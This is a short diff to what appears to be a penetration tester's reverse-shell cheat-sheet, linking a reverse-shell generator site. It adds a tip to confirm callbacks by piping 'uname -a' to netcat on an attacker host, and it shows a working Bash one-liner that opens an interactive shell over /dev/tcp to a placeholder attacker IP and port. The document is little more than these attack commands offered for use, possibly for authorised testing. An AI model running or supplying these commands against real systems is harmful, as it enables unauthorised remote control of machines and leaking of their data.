@@ -2,6 +2,10 @@
 
 https://www.revshells.com/
 
+# Test that we can rev shell
+
+	Before trying to get a rev shell, we might want to try a ping <ip> into a tcp dump or a uname -a | nc <ip> <port>, to see if we actually get a callback
+
 ## Bash
 
 	bash -i >& /dev/tcp/<YOUR_IP>/<NETCAT_PORT> 0>&1
